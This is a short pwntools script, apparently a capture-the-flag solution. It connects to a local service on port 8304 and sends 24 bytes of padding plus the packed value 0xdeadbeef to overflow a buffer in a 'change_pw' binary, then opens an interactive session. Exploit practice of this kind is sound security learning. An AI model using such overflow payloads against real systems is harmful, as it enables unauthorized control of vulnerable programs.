from pwn import *

io = remote('localhost', '8304')
# io = process('./change_pw')

io.recvline()
io.sendline(b'a'*0x18 + p64(0xdeadbeef))

io.interactive()
